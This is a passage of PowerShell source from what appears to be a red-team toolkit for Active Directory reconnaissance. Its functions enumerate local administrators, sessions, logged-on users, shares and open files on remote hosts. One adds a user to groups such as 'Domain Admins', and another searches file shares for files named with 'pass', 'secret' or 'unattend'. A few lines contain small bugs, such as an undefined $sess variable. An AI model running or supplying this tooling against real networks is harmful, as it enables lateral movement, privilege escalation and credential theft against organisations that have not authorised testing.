        Note: in order for the accountdisabled field to be properly extracted,
        the NETBIOS name needs to be supplied, not the IP or FQDN.

        .PARAMETER HostName
        The hostname or IP to query for local group users.

        .PARAMETER HostList
        List of hostnames/IPs to query for local group users.
         
        .PARAMETER GroupName
        The local group name to query for users. If not given, it defaults to "Administrators"
            
        .OUTPUTS
        Object[] array of found users for the specified local group.

        .EXAMPLE
        > Get-NetLocalGroup
        Returns the usernames that of members of localgroup "Administrators" on the local host.
        
        .EXAMPLE
        > Get-NetLocalGroup -HostName WINDOWSXP
        Returns all the local administrator accounts for WINDOWSXP

        .LINK
        http://stackoverflow.com/questions/21288220/get-all-local-members-and-groups-displayed-together
        http://msdn.microsoft.com/en-us/library/aa772211(VS.85).aspx
    #>
    
    [CmdletBinding()]
    param(
        [string]
        $HostName = 'localhost',

        [string]
        $HostList,
        
        [string]
        $GroupName
    )
    
    $Servers = @()
    
    # if we have a host list passed, grab it
    if($HostList){
        if (Test-Path -Path $HostList){
            $Servers = Get-Content -Path $HostList
        }
        else{
            Write-Warning "[!] Input file '$HostList' doesn't exist!"
            $null
        }
    }
    else{
        # otherwise assume a single host name
        $Servers = $($HostName)
    }
    
    if (-not $GroupName){
        # resolve the SID for the local admin group - this should usually default to "Administrators"
        $objSID = New-Object System.Security.Principal.SecurityIdentifier('S-1-5-32-544')
        $objgroup = $objSID.Translate( [System.Security.Principal.NTAccount])
        $GroupName = ($objgroup.Value).Split('\')[1]
    }
    
    # query the specified group using the WINNT provider, and
    # extract fields as appropriate from the results
    foreach($Server in $Servers)
    {
        try{
            $members = @($([ADSI]"WinNT://$server/$groupname").psbase.Invoke('Members'))
            $members | ForEach-Object {
                $out = New-Object psobject
                $out | Add-Member Noteproperty 'Server' $Server
                $out | Add-Member Noteproperty 'AccountName' ( $_.GetType().InvokeMember('Adspath', 'GetProperty', $null, $_, $null)).Replace('WinNT://', '')
                # translate the binary sid to a string
                $out | Add-Member Noteproperty 'SID' (ConvertSID ($_.GetType().InvokeMember('ObjectSID', 'GetProperty', $null, $_, $null)))
                # if the account is local, check if it's disabled, if it's domain, always print $false
                $out | Add-Member Noteproperty 'Disabled' $(if((($_.GetType().InvokeMember('Adspath', 'GetProperty', $null, $_, $null)).Replace('WinNT://', '')-like "*/$server/*")) {try{$_.GetType().InvokeMember('AccountDisabled', 'GetProperty', $null, $_, $null)} catch {'ERROR'} } else {$False} ) 
                # check if the member is a group
                $out | Add-Member Noteproperty 'IsGroup' ($_.GetType().InvokeMember('Class', 'GetProperty', $Null, $_, $Null) -eq 'group')
                $out
            }
        }
        catch {
            Write-Warning "[!] Error: $_"
        }
    }
    
}


function Get-NetLocalServices {
    <#
        .SYNOPSIS
        Gets a list of all local services running on a remote machine.
        
        .DESCRIPTION
        This function utilizes ADSI to query a remote (or local) host for
        all locally running services.

        .PARAMETER HostName
        The hostname or IP to query for local group users.

        .PARAMETER HostList
        List of hostnames/IPs to query for local group users.

        .OUTPUTS
        System.Array. An array of found services for the specified group.

        .EXAMPLE
        > Get-NetLocalServices -HostName WINDOWSXP
        Returns all the local services running on for WINDOWSXP
    #>
    
    [CmdletBinding()]
    param(
        [string]
        $HostName = 'localhost',

        [string]
        $HostList
    )
    
    $Servers = @()
    
    # if we have a host list passed, grab it
    if($HostList){
        if (Test-Path -Path $HostList){
            $Servers = Get-Content -Path $HostList
        }
        else{
            Write-Warning "[!] Input file '$HostList' doesn't exist!"
            return
        }
    }
    else{
        # otherwise assume a single host name
        $Servers = $($HostName)
    }
    
    foreach($Server in $Servers)
    {
        $computer = [ADSI]"WinNT://$server,computer"
        
        $computer.psbase.children | Where-Object { $_.psbase.schemaClassName -eq 'service' } | ForEach-Object {
            $out = New-Object psobject
            $out | Add-Member Noteproperty 'Server' $Server
            $out | Add-Member Noteproperty 'ServiceName' $_.name[0]
            $out | Add-Member Noteproperty 'ServicePath' $_.Path[0]
            $out | Add-Member Noteproperty 'ServiceAccountName' $_.ServiceAccountName[0]
            $out
        }
    }
}


function Invoke-NetGroupUserAdd {
    <#
        .SYNOPSIS
        Adds a local or domain user to a local or domain group.
        
        .DESCRIPTION
        This function utilizes DirectoryServices.AccountManagement to add a
        user to a local machine or domain group (if permissions allow). It will
        default to addingt to the local machine.

        .PARAMETER UserName
        The domain username to query for.

        .PARAMETER GroupName
        Group to add the user to.

        .PARAMETER Domain
        Domain to add the user to.
        
        .PARAMETER HostName
        Hostname to add the user to, defaults to localhost.
            
        .OUTPUTS
        System.bool. True if the add succeeded, false otherwise.

        .EXAMPLE
        > Invoke-NetGroupUserAdd -UserName john -GroupName Administrators
        Adds a localuser "john" to the local group "Administrators"

        .EXAMPLE
        > Invoke-NetGroupUserAdd -UserName john -GroupName "Domain Admins" -Domain
        Adds the existing user "john" to the domain group "Domain Admins" 
    #>
    
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $True)] 
        [string]
        $UserName,

        [Parameter(Mandatory = $True)] 
        [string]
        $GroupName,
        
        [string]
        $Domain,
        
        [string]
        $HostName = 'localhost'
    )
    
    # add the assembly if we need it
    Add-Type -AssemblyName System.DirectoryServices.AccountManagement
    
    # if we're adding to a remote host, use the WinNT provider
    if($HostName -ne 'localhost'){
        try{
            ([ADSI]"WinNT://$HostName/$GroupName,group").add("WinNT://$HostName/$UserName,user")
            "[*] User $UserName successfully added to group $GroupName on $HostName"
        }
        catch{
            Write-Warning "[!] Error adding user $UserName to group $GroupName on $HostName"
            return
        }
    }
    
    # otherwise it's a local or domain add
    else{
        if ($Domain){
            try{
                # try to create the context for the target domain
                $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $Domain)
                $d = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
                
                # get the domain context
                $ct = [System.DirectoryServices.AccountManagement.ContextType]::Domain
            }
            catch{
                Write-Warning "The specified domain $Domain does not exist, could not be contacted, or there isn't an existing trust."
                return $null
            }
        }
        else{
            # otherwise, get the local machine context
            $ct = [System.DirectoryServices.AccountManagement.ContextType]::Machine
        }
        
        # get the full principal context
        $context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList $ct, $d
        
        # find the particular group
        $group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($context,$GroupName)
        
        # add the particular user to the group
        $group.Members.add($context, [System.DirectoryServices.AccountManagement.IdentityType]::SamAccountName, $UserName)
        
        # commit the changes
        $group.Save()
    }
}


function Get-NetFileServers {
    <#
        .SYNOPSIS
        Returns a list of all file servers extracted from user home directory fields.
        
        .DESCRIPTION
        This function pulls all user information, extracts all file servers from
        user home directories, and returns the uniquified list.

        .PARAMETER Domain
        The domain to query for user file servers.

        .OUTPUTS
        System.Array. An array of found fileservers.

        .EXAMPLE
        > Get-NetFileServers
        Returns active file servers.

        .EXAMPLE
        > Get-NetFileServers -Domain testing
        Returns active file servers for the 'testing' domain.
    #>
    
    [CmdletBinding()]
    param(
        [string]
        $Domain
    )
    
    $FileServers = @()
    
    # get all the domain users for the specified or local domain
    if ($Domain){
        $users = Get-NetUsers -Domain $Domain
    }
    else{
        $users = Get-NetUsers
    }
    
    # extract all home directories and create a unique list
    foreach ($user in $users){
        
        $d = $user.homedirectory
        # pull the HomeDirectory field from this user record
        if ($d){
            $d = $user.homedirectory[0]
        }
        if (($d -ne $null) -and ($d.trim() -ne '')){
            # extract the server name from the homedirectory path
            $parts = $d.split('\')
            if ($parts.count -gt 2){
                # append the base file server to the target $FileServers list
                if($parts[2] -ne ''){
                    $FileServers += $parts[2].toLower()
                }
            }
        }
    }
    
    # uniquify the fileserver list and return it
    $($FileServers | Sort-Object | Get-Unique)
}


function Get-NetShare {
    <#
        .SYNOPSIS
        Gets share information for a specified server.
    
        .DESCRIPTION
        This function will execute the NetShareEnum Win32API call to query
        a given host for open shares. This is a replacement for
        "net share \\hostname"

        .PARAMETER HostName
        The hostname to query for shares.

        .OUTPUTS
        SHARE_INFO_1 structure. A representation of the SHARE_INFO_1
        result structure which includes the name and note for each share.

        .EXAMPLE
        > Get-NetShare
        Returns active shares on the local host.

        .EXAMPLE
        > Get-NetShare -HostName sqlserver
        Returns active shares on the 'sqlserver' host
    #>
    
    [CmdletBinding()]
    param(
        [string]
        $HostName = 'localhost'
    )
    
    If ($PSBoundParameters['Debug']) {
        $DebugPreference = 'Continue'
    }
    
    # arguments for NetShareEnum
    $QueryLevel = 1
    $ptrInfo = [IntPtr]::Zero
    $EntriesRead = 0
    $TotalRead = 0
    $ResumeHandle = 0

    # get the share information
    $Result = $Netapi32::NetShareEnum($HostName, $QueryLevel,[ref]$ptrInfo,-1,[ref]$EntriesRead,[ref]$TotalRead,[ref]$ResumeHandle)

    # Locate the offset of the initial intPtr
    $offset = $ptrInfo.ToInt64()
    
    Write-Debug "Get-NetShare result: $Result"
    
    # 0 = success
    if (($Result -eq 0) -and ($offset -gt 0)) {
        
        # Work out how mutch to increment the pointer by finding out the size of the structure
        $Increment = $SHARE_INFO_1::GetSize()
        
        # parse all the result structures
        for ($i = 0; ($i -lt $EntriesRead); $i++){
            # create a new int ptr at the given offset and cast 
            # the pointer as our result structure
            $newintptr = New-Object system.Intptr -ArgumentList $offset
            $Info = $newintptr -as $SHARE_INFO_1
            # return all the sections of the structure
            $Info | Select-Object *
            $offset = $newintptr.ToInt64()
            $offset += $increment
        }
        # free up the result buffer
        $Netapi32::NetApiBufferFree($ptrInfo) | Out-Null
    }
    else 
    {
        switch ($Result) {
            (5)           {Write-Debug 'The user does not have access to the requested information.'}
            (124)         {Write-Debug 'The value specified for the level parameter is not valid.'}
            (87)          {Write-Debug 'The specified parameter is not valid.'}
            (234)         {Write-Debug 'More entries are available. Specify a large enough buffer to receive all entries.'}
            (8)           {Write-Debug 'Insufficient memory is available.'}
            (2312)        {Write-Debug 'A session does not exist with the computer name.'}
            (2351)        {Write-Debug 'The computer name is not valid.'}
            (2221)        {Write-Debug 'Username not found.'}
            (53)          {Write-Debug 'Hostname could not be found'}
        }
    }
}


function Get-NetLoggedon {
    <#
        .SYNOPSIS
        Gets users actively logged onto a specified server.
        
        .DESCRIPTION
        This function will execute the NetWkstaUserEnum Win32API call to query
        a given host for actively logged on users.

        .PARAMETER HostName
        The hostname to query for logged on users.

        .OUTPUTS
        WKSTA_USER_INFO_1 structure. A representation of the WKSTA_USER_INFO_1
        result structure which includes the username and domain of logged on users.

        .EXAMPLE
        > Get-NetLoggedon
        Returns users actively logged onto the local host.

        .EXAMPLE
        > Get-NetLoggedon -HostName sqlserver
        Returns users actively logged onto the 'sqlserver' host.

        .LINK
        http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/
    #>
    
    [CmdletBinding()]
    param(
        [string]
        $HostName = 'localhost'
    )
    
    If ($PSBoundParameters['Debug']) {
        $DebugPreference = 'Continue'
    }
    
    # Declare the reference variables
    $QueryLevel = 1
    $ptrInfo = [IntPtr]::Zero
    $EntriesRead = 0
    $TotalRead = 0
    $ResumeHandle = 0

    # get logged on user information
    $Result = $Netapi32::NetWkstaUserEnum($HostName, $QueryLevel,[ref]$PtrInfo,-1,[ref]$EntriesRead,[ref]$TotalRead,[ref]$ResumeHandle)
    
    # Locate the offset of the initial intPtr
    $offset = $ptrInfo.ToInt64()
    
    Write-Debug "Get-NetLoggedon result: $Result"
    
    # 0 = success
    if (($Result -eq 0) -and ($offset -gt 0)) {
        
        # Work out how mutch to increment the pointer by finding out the size of the structure
        $Increment = $WKSTA_USER_INFO_1::GetSize()

        # parse all the result structures
        for ($i = 0; ($i -lt $EntriesRead); $i++){
            # create a new int ptr at the given offset and cast 
            # the pointer as our result structure
            $newintptr = New-Object system.Intptr -ArgumentList $offset
            $Info = $newintptr -as $WKSTA_USER_INFO_1
            # return all the sections of the structure
            $Info | Select-Object *
            $offset = $newintptr.ToInt64()
            $offset += $increment

        }
        # free up the result buffer
        $Netapi32::NetApiBufferFree($PtrInfo) | Out-Null
    }
    else 
    {
        switch ($Result) {
            (5)           {Write-Debug 'The user does not have access to the requested information.'}
            (124)         {Write-Debug 'The value specified for the level parameter is not valid.'}
            (87)          {Write-Debug 'The specified parameter is not valid.'}
            (234)         {Write-Debug 'More entries are available. Specify a large enough buffer to receive all entries.'}
            (8)           {Write-Debug 'Insufficient memory is available.'}
            (2312)        {Write-Debug 'A session does not exist with the computer name.'}
            (2351)        {Write-Debug 'The computer name is not valid.'}
            (2221)        {Write-Debug 'Username not found.'}
            (53)          {Write-Debug 'Hostname could not be found'}
        }
    }
}


function Get-NetConnections {
    <#
        .SYNOPSIS
        Gets active connections to a server resource.
        
        .DESCRIPTION
        This function will execute the NetConnectionEnum Win32API call to query
        a given host for users connected to a particular resource.
        
        Note: only members of the Administrators or Account Operators local group 
        can successfully execute NetFileEnum

        .PARAMETER HostName
        The hostname to query.

        .PARAMETER Share
        The share to check connections to.

        .OUTPUTS
        CONNECTION_INFO_1  structure. A representation of the CONNECTION_INFO_1 
        result structure which includes the username host of connected users.

        .EXAMPLE
        > Get-NetConnections -HostName fileserver -Share secret
        Returns users actively connected to the share 'secret' on a fileserver.

        .LINK
        http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/
    #>
    [CmdletBinding()]
    param(
        [string]
        $HostName = 'localhost',

        [string]
        $Share = "C$"
    )
    
    If ($PSBoundParameters['Debug']) {
        $DebugPreference = 'Continue'
    }
    
    # arguments for NetConnectionEnum
    $QueryLevel = 1
    $ptrInfo = [IntPtr]::Zero
    $EntriesRead = 0
    $TotalRead = 0
    $ResumeHandle = 0

    # get connection information
    $Result = $Netapi32::NetConnectionEnum($HostName, $Share, $QueryLevel,[ref]$ptrInfo,-1,[ref]$EntriesRead,[ref]$TotalRead,[ref]$ResumeHandle)   
    
    # Locate the offset of the initial intPtr
    $offset = $ptrInfo.ToInt64()
    
    Write-Debug "Get-NetConnection result: $Result"
    
    # 0 = success
    if (($Result -eq 0) -and ($offset -gt 0)) {
        
        # Work out how mutch to increment the pointer by finding out the size of the structure
        $Increment = $CONNECTION_INFO_1::GetSize()
        
        # parse all the result structures
        for ($i = 0; ($i -lt $EntriesRead); $i++){
            # create a new int ptr at the given offset and cast 
            # the pointer as our result structure
            $newintptr = New-Object system.Intptr -ArgumentList $offset
            $Info = $newintptr -as $CONNECTION_INFO_1
            # return all the sections of the structure
            $Info | Select-Object *
            $offset = $newintptr.ToInt64()
            $offset += $increment

        }
        # free up the result buffer
        $Netapi32::NetApiBufferFree($PtrInfo) | Out-Null
    }
    else 
    {
        switch ($Result) {
            (5)           {Write-Debug 'The user does not have access to the requested information.'}
            (124)         {Write-Debug 'The value specified for the level parameter is not valid.'}
            (87)          {Write-Debug 'The specified parameter is not valid.'}
            (234)         {Write-Debug 'More entries are available. Specify a large enough buffer to receive all entries.'}
            (8)           {Write-Debug 'Insufficient memory is available.'}
            (2312)        {Write-Debug 'A session does not exist with the computer name.'}
            (2351)        {Write-Debug 'The computer name is not valid.'}
            (2221)        {Write-Debug 'Username not found.'}
            (53)          {Write-Debug 'Hostname could not be found'}
        }
    }
}


function Get-NetSessions {
    <#
        .SYNOPSIS
        Gets active sessions for a specified server.
        Heavily adapted from dunedinite's post on stackoverflow (see LINK below)

        .DESCRIPTION
        This function will execute the NetSessionEnum Win32API call to query
        a given host for active sessions on the host.

        .PARAMETER HostName
        The hostname to query for active sessions.

        .PARAMETER UserName
        The user name to filter for active sessions.

        .OUTPUTS
        SESSION_INFO_10 structure. A representation of the SESSION_INFO_10
        result structure which includes the host and username associated
        with active sessions.

        .EXAMPLE
        > Get-NetSessions
        Returns active sessions on the local host.

        .EXAMPLE
        > Get-NetSessions -HostName sqlserver
        Returns active sessions on the 'sqlserver' host.

        .LINK
        http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/
    #>
    
    [CmdletBinding()]
    param(
        [string]
        $HostName = 'localhost',

        [string]
        $UserName = ''
    )
    
    If ($PSBoundParameters['Debug']) {
        $DebugPreference = 'Continue'
    }
    
    # arguments for NetSessionEnum
    $QueryLevel = 10
    $ptrInfo = [IntPtr]::Zero
    $EntriesRead = 0
    $TotalRead = 0
    $ResumeHandle = 0

    # get session information
    $Result = $Netapi32::NetSessionEnum($HostName, '', $UserName, $QueryLevel,[ref]$ptrInfo,-1,[ref]$EntriesRead,[ref]$TotalRead,[ref]$ResumeHandle)    

    # Locate the offset of the initial intPtr
    $offset = $ptrInfo.ToInt64()
    
    Write-Debug "Get-NetSessions result: $Result"
    
    # 0 = success
    if (($Result -eq 0) -and ($offset -gt 0)) {
        
        # Work out how mutch to increment the pointer by finding out the size of the structure
        $Increment = $SESSION_INFO_10::GetSize()
        
        # parse all the result structures
        for ($i = 0; ($i -lt $EntriesRead); $i++){
            # create a new int ptr at the given offset and cast 
            # the pointer as our result structure
            $newintptr = New-Object system.Intptr -ArgumentList $offset
            $Info = $newintptr -as $SESSION_INFO_10
            # return all the sections of the structure
            $Info | Select-Object *
            $offset = $newintptr.ToInt64()
            $offset += $increment

        }
        # free up the result buffer
        $Netapi32::NetApiBufferFree($PtrInfo) | Out-Null
    }
    else 
    {
        switch ($Result) {
            (5)           {Write-Debug 'The user does not have access to the requested information.'}
            (124)         {Write-Debug 'The value specified for the level parameter is not valid.'}
            (87)          {Write-Debug 'The specified parameter is not valid.'}
            (234)         {Write-Debug 'More entries are available. Specify a large enough buffer to receive all entries.'}
            (8)           {Write-Debug 'Insufficient memory is available.'}
            (2312)        {Write-Debug 'A session does not exist with the computer name.'}
            (2351)        {Write-Debug 'The computer name is not valid.'}
            (2221)        {Write-Debug 'Username not found.'}
            (53)          {Write-Debug 'Hostname could not be found'}
        }
    }
}


function Get-NetFiles {
    <#
        .SYNOPSIS
        Get files opened on a remote server.

        .DESCRIPTION
        This function will execute the NetFileEnum Win32API call to query
        a given host for information about open files. 

        Note: only members of the Administrators or Account Operators local group 
        can successfully execute NetFileEnum

        .PARAMETER HostName
        The hostname to query for open files.

        .PARAMETER TargetUser
        Return files open only from this particular user.

        .PARAMETER TargetHost
        Return files open only from this particular host.

        .OUTPUTS
        FILE_INFO_3 structure. A representation of the FILE_INFO_3
        result structure which includes the host and username associated
        with active sessions.

        .EXAMPLE
        > Get-NetFiles -HostName fileserver
        Returns open files/owners on fileserver.

        .EXAMPLE
        > Get-NetFiles -HostName fileserver -TargetUser john
        Returns files opened on fileserver by 'john'
       
        .EXAMPLE
        > Get-NetFiles -HostName fileserver -TargetHost 192.168.1.100
        Returns files opened on fileserver from host 192.168.1.100

        .LINK
        http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/
    #>
    
    [CmdletBinding()]
    param(
        [string]
        $HostName = 'localhost',

        [string]
        $TargetUser = '',

        [string]
        $TargetHost
    )
    
    If ($PSBoundParameters['Debug']) {
        $DebugPreference = 'Continue'
    }
    
    # if a target host is specified, format/replace variables
    if ($TargetHost){
        $TargetUser = "\\$TargetHost"
    }
    
    # arguments for NetFileEnum
    $QueryLevel = 3
    $ptrInfo = [IntPtr]::Zero
    $EntriesRead = 0
    $TotalRead = 0
    $ResumeHandle = 0

    # get file information
    $Result = $Netapi32::NetFileEnum($HostName, '', $TargetUser, $QueryLevel,[ref]$ptrInfo,-1,[ref]$EntriesRead,[ref]$TotalRead,[ref]$ResumeHandle)   

    # Locate the offset of the initial intPtr
    $offset = $ptrInfo.ToInt64()
    
    Write-Debug "Get-NetFiles result: $Result"
    
    # 0 = success
    if (($Result -eq 0) -and ($offset -gt 0)) {
        
        # Work out how mutch to increment the pointer by finding out the size of the structure
        $Increment = $FILE_INFO_3::GetSize()

        # parse all the result structures
        for ($i = 0; ($i -lt $EntriesRead); $i++){
            # create a new int ptr at the given offset and cast 
            # the pointer as our result structure
            $newintptr = New-Object system.Intptr -ArgumentList $offset
            $Info = $newintptr -as $FILE_INFO_3
            # return all the sections of the structure
            $Info | Select-Object *
            $offset = $newintptr.ToInt64()
            $offset += $increment

        }
        # free up the result buffer
        $Netapi32::NetApiBufferFree($PtrInfo) | Out-Null
    }
    else 
    {
        switch ($Result) {
            (5)           {Write-Debug  'The user does not have access to the requested information.'}
            (124)         {Write-Debug 'The value specified for the level parameter is not valid.'}
            (87)          {Write-Debug 'The specified parameter is not valid.'}
            (234)         {Write-Debug 'More entries are available. Specify a large enough buffer to receive all entries.'}
            (8)           {Write-Debug 'Insufficient memory is available.'}
            (2312)        {Write-Debug 'A session does not exist with the computer name.'}
            (2351)        {Write-Debug 'The computer name is not valid.'}
            (2221)        {Write-Debug 'Username not found.'}
            (53)          {Write-Debug 'Hostname could not be found'}
        }
    }
}


function Get-NetFileSessions {
    <#
        .SYNOPSIS
        Matches up Get-NetSessions with Get-NetFiles to see who
        has opened files on the server and from where.

        .DESCRIPTION
        Matches up Get-NetSessions with Get-NetFiles to see who
        has opened files on the server and from where.

        .PARAMETER HostName
        The hostname to query for open sessions/files. 
        Defaults to localhost.

        .PARAMETER OutFile
        Output results to a specified csv output file.

        .OUTPUTS
        ....

        .EXAMPLE
        > Get-NetFileSessions
        Returns open file/session information for the localhost

        .EXAMPLE
        > Get-NetFileSessions -HostName WINDOWS1
        Returns open file/session information for the WINDOWS1 host

        .LINK
        http://www.harmj0y.net/blog/redteaming/file-server-triage-on-red-team-engagements/
    #>
    
    
    [CmdletBinding()]
    param(
        [string]
        $HostName = 'localhost',

        [string]
        $OutFile
    )
    
    # holder for our session data
    $sessions=@{};
    
    # grab all the current sessions for the host
    Get-Netsessions -HostName $HostName | ForEach-Object { $sessions[$_.sesi10_username] = $_.sesi10_cname };
    
    # mesh the NetFiles data with the NetSessions data
    $data = Get-NetFiles | Select-Object @{Name='Username';Expression={$_.fi3_username}},@{Name='Filepath';Expression={$_.fi3_pathname}},@{Name='Computer';Expression={$sess[$_.fi3_username]}}
    
    # output to a CSV file if specified
    if ($OutFile) {
        $data | export-csv -notypeinformation -path $OutFile
    }
    else{
        # otherwise just dump everything to stdout
        $data
    }   
}


function Get-LastLoggedOn {
    <#
        .SYNOPSIS
        Gets the last user logged onto a target machine.

        .DESCRIPTION
        This function uses remote registry functionality to return
        the last user logged onto a target machine.

        Note: This function requires administrative rights on the
        machine you're enumerating.

        .PARAMETER HostName
        The hostname to query for open files. Defaults to the 
        local host name.

        .OUTPUTS
        The last loggedon user name, or $null if the enumeration fails.

        .EXAMPLE
        > Get-LastLoggedOn
        Returns the last user logged onto the local machine.

        .EXAMPLE
        > Get-LastLoggedOn -HostName WINDOWS1
        Returns the last user logged onto WINDOWS1
    #>
    
    [CmdletBinding()]
    param(
        $HostName
    )
    
    # default to the local hostname
    if (-not $HostName){
        $HostName = [System.Net.Dns]::GetHostName()
    }
    
    # try to open up the remote registry key to grab the last logged on user
    try{
        $reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine', $HostName)
        $regKey= $reg.OpenSubKey('SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI',$false)
        $regKey.GetValue('LastLoggedOnUser')
    }
    catch{
        Write-Warning "[!] Error opening remote registry on $HostName. Remote registry likely not enabled."
        $null
    }
}


function Get-UserProperties {
    <#
        .SYNOPSIS
        Returns a list of all user object properties. If a property
        name is specified, it returns all [user:property] values.

        Taken directly from @obscuresec's post referenced in the link.
        
        .DESCRIPTION
        This function a list of all user object properties, optionally
        returning all the user:property combinations if a property 
        name is specified.

        .PARAMETER Domain
        The domain to query for user properties.

        .PARAMETER Properties
        Return property names for users. 

        .OUTPUTS
        System.Object[] array of all extracted user properties.

        .EXAMPLE
        > Get-UserProperties
        Returns all user properties for users in the current domain.

        .EXAMPLE
        > Get-UserProperties -Properties ssn,lastlogon,location
        Returns all an array of user/ssn/lastlogin/location combinations
        for users in the current domain.

        .EXAMPLE
        > Get-UserProperties -Domain testing
        Returns all user properties for users in the 'testing' domain.

        .LINK
        http://obscuresecurity.blogspot.com/2014/04/ADSISearcher.html
    #>
    
    [CmdletBinding()]
    param(
        [string]
        $Domain,

        [string[]]
        $Properties
    )

    $properties.gettype()
    
    # if properties are specified, return all values of it for all users
    if ($Properties){
        if ($Domain){
            $users = Get-NetUsers -Domain $Domain
        }
        else{
            $users = Get-NetUsers
        }
        $users | ForEach-Object {
            
            $props = @{}
            $s = $_.Item('SamAccountName')
            $props.Add('SamAccountName', "$s")
            
            if($Properties -isnot [system.array]){
                $Properties = @($Properties)
            }
            foreach($Property in $Properties){
                $p = $_.Item($Property)
                $props.Add($Property, "$p")
            }
            [pscustomobject] $props
        }
        
    }
    else{
        # otherwise return all the property names themselves
        if ($Domain){

            # try to grab the primary DC for the current domain
            try{
                $PrimaryDC = ([Array](Get-NetDomainControllers))[0].Name
            }
            catch{
                $PrimaryDC = $Null
            }

            $dn = "DC=$($Domain.Replace('.', ',DC='))"

            # if we could grab the primary DC for the current domain, use that for the query
            if($PrimaryDC){
                $UserSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$PrimaryDC/$dn")
            }
            else{
                # otherwise try to connect to the DC for the target domain
                $UserSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$dn")
            }

            # samAccountType=805306368 indicates user objects 
            $UserSearcher.filter = '(&(samAccountType=805306368))'
            (($UserSearcher.FindAll())[0].properties).PropertyNames
        }
        else{
            ((([adsisearcher]'objectCategory=User').Findall())[0].properties).PropertyNames
        }
    }
}


function Get-ComputerProperties {
    <#
        .SYNOPSIS
        Returns a list of all computer object properties. If a property
        name is specified, it returns all [computer:property] values.

        Taken directly from @obscuresec's post referenced in the link.
        
        .DESCRIPTION
        This function a list of all computer object properties, optinoally
        returning all the computer:property combinations if a property 
        name is specified.

        .PARAMETER Domain
        The domain to query for computer properties.

        .PARAMETER Properties
        Return property names for computers. 

        .OUTPUTS
        System.Object[] array of all extracted computer properties.

        .EXAMPLE
        > Get-ComputerProperties
        Returns all computer properties for computers in the current domain.

        .EXAMPLE
        > Get-ComputerProperties -Properties ssn,lastlogon,location
        Returns all an array of computer/ssn/lastlogin/location combinations
        for computers in the current domain.

        .EXAMPLE
        > Get-ComputerProperties -Domain testing
        Returns all user properties for computers in the 'testing' domain.

        .LINK
        http://obscuresecurity.blogspot.com/2014/04/ADSISearcher.html
    #>
    
    [CmdletBinding()]
    param(
        [string]
        $Domain,

        [string[]]
        $Properties
    )
    
    # if a domain is specified, try to grab that domain
    if ($Domain){

        # try to grab the primary DC for the current domain
        try{
            $PrimaryDC = ([Array](Get-NetDomainControllers))[0].Name
        }
        catch{
            $PrimaryDC = $Null
        }

        try {
            $dn = "DC=$($Domain.Replace('.', ',DC='))"

            if($PrimaryDC){
                $CompSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$PrimaryDC/$dn") 
            }
            else{
                $CompSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$dn") 
            }
            $CompSearcher.filter='(&(objectClass=Computer))'
            
        }
        catch{
            Write-Warning "The specified domain $Domain does not exist, could not be contacted, or there isn't an existing trust."
        }
    }
    else{
        $CompSearcher = [adsisearcher]'(&(objectClass=Computer))'
    }
    
    
    if ($CompSearcher){
        # if specific property names were passed, try to extract those
        if ($Properties){
            $CompSearcher.FindAll() | ForEach-Object {
                $props = @{}
                $s = $_.Properties.name
                $props.Add('Name', "$s")
                
                if($Properties -isnot [system.array]){
                    $Properties = @($Properties)
                }
                foreach($Property in $Properties){
                    $p = $_.Properties.$Property
                    $props.Add($Property, "$p")
                }
                [pscustomobject] $props
            }
        }
        else{
            # otherwise return all property names
            (($CompSearcher.FindAll())[0].properties).PropertyNames
        }
    }
    
}


function Invoke-SearchFiles {
    <#
        .SYNOPSIS
        Searches a given server/path for files with specific terms in the name.
        
        .DESCRIPTION
        This function recursively searches a given UNC path for files with 
        specific keywords in the name (default of pass, sensitive, secret, admin,
        login and unattend*.xml). The output can be piped out to a csv with the 
        -OutFile flag. By default, hidden files/folders are included in search results.

        .PARAMETER Path
        UNC/local path to recursively search.

        .PARAMETER Terms
        Terms to search for.

        .PARAMETER OfficeDocs
        Search for office documents (*.doc*, *.xls*, *.ppt*)

        .PARAMETER FreshEXES
        Find .EXEs accessed within the last week.

        .PARAMETER AccessDateLimit
        Only return files with a LastAccessTime greater than this date value.

        .PARAMETER WriteDateLimit
        Only return files with a LastWriteTime greater than this date value.

        .PARAMETER CreateDateLimit
        Only return files with a CreationDate greater than this date value.

        .PARAMETER ExcludeFolders
        Exclude folders from the search results.

        .PARAMETER ExcludeHidden
        Exclude hidden files and folders from the search results.

        .PARAMETER CheckWriteAccess
        Only returns files the current user has write access to.

        .PARAMETER OutFile
        Output results to a specified csv output file.

        .OUTPUTS
        The full path, owner, lastaccess time, lastwrite time, and size for
        each found file.

        .EXAMPLE
        > Invoke-SearchFiles -Path \\WINDOWS7\Users\
        Returns any files on the remote path \\WINDOWS7\Users\ that have 'pass',
        'sensitive', or 'secret' in the title.

        .EXAMPLE
        > Invoke-SearchFiles -Path \\WINDOWS7\Users\ -Terms salaries,email -OutFile out.csv
        Returns any files on the remote path \\WINDOWS7\Users\ that have 'salaries'
        or 'email' in the title, and writes the results out to a csv file
        named 'out.csv'

        .EXAMPLE
        > Invoke-SearchFiles -Path \\WINDOWS7\Users\ -AccessDateLimit 6/1/2014
        Returns all files accessed since 6/1/2014.

        .LINK
        http://www.harmj0y.net/blog/redteaming/file-server-triage-on-red-team-engagements/
    #>
    
    [CmdletBinding()]
    param(
        [string]
        $Path = '.\',

        [string[]]
        $Terms,

        [Switch]
        $OfficeDocs,
        
        [Switch]
        $FreshEXES,

        [string]
        $AccessDateLimit = '1/1/1970',

        [string]
        $WriteDateLimit = '1/1/1970',

        [string]
